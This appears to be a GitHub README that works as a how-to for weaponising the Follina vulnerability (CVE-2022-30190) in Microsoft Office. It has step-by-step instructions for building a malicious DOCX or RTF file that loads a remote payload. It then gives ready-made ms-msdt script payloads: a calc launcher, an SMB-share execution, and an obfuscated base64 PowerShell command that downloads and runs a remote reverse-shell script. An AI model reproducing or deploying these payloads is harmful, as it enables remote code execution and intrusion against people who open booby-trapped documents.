# MS-MSDT-Office-RCE-Follina
CVE-2022-30190 | MS-MSDT Follina One Click

1. Create a Docx file.
2. In the Docx file, Insert > Object > Bitmap Image > Ok
3. In the Paint application that launched, save the Paint file.
4. Save your Docx file.
5. Open your file as an archive (With 7Zip; Right Click > 7Zip > Open Archive.)
6. Copy out the Document.xml from \Word\ and document.xml.rels file from \word_rels\
7. Open/Edit the \word\_rels\Document.xml.rels and locate the relationship XML Tag with "/relationships/oleObject". After this replace the destination in "Target=" to your remote destination where it will grab the payload from. Also add "TargetMode="External"" to the XML Tag.
8. Compress back to Docx file (Send to > Compressed (zipped) folder  |  Rename file type from zip > docx/doc )

--------------------------------------------------------------------------------------------------------
### RTF File Type
Once a docx has been saved utilizing the paramaters step / paramaters below. Save the Docx as an RTF.

> If you also add these elements under the `<o:OLEObject>` element in `word/document.xml`:

```
<o:LinkType>EnhancedMetaFile</o:LinkType>
<o:LockedField>false</o:LockedField>
<o:FieldCodes>\f 0</o:FieldCodes>
```

--------------------------------------------------------------------------------------------------------
The act of recompressing can be observed from JohnHammond's Python Script as well:  
    ~ Rebuild the original office file ~  
    
    shutil.make_archive(args.output, "zip", doc_path)  
    os.rename(args.output + ".zip", args.output)  
    
Reference: https://github.com/JohnHammond/msdt-follina/blob/main/follina.py



--------------------------------------------------------------------------------------------------------





## Payloads 

### Basic Calc Execute:
```
<script>
window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Start-Process('calc'))i/../../../../../../../../../../../../../../Windows/system32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
</script>
```

Can Replace the Start-Process('calc') with:
> IEX('calc.exe')
--------------------------------------------------------------------------------------------------------
### SMB Share Execution:

```
<script>
location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=/../../$(\\\\taretip\\share\\poc)/.exe)"";
</script>
```
--------------------------------------------------------------------------------------------------------
### PS1 File Load:
```
<script>
window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'cG93ZXJzaGVsbC5leGUgLWMgImlleCAoaXdyIGh0dHA6Ly8xOTIuMTY4LjE5OC4xMjgvcmV2LnBzMSAtVXNlQmFzaWNQYXJzaW5nKSIK'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \"";
</script>  
```

Decoded:
Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("powershell.exe -c "iex (iwr http://192.168.198.128/rev.ps1 -UseBasicParsing)""))

--------------------------------------------------------------------------------------------------------
### Apache2 access.log should show connection upon opening file
![Log Example](/log.png?raw=true "Example")

